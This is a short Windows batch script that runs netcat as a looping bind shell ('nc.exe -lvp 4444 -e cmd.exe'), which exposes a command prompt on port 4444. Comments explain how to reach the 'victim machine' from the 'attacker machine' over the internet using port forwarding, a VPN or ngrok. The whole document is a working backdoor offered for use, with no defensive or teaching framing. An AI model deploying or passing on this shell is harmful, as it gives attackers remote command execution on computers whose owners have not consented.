@echo off
cls
:start
nc.exe -lvp 4444 -e cmd.exe
goto start
#u can use nc over wan if you portforward "
# use portforwarding ipadress and its port to connect"
# portmaio io vpn must be run of victim machine
# on attacker machine nc "ngrok or local target machine" and port" if local "4444"
# if wan "portforward port"
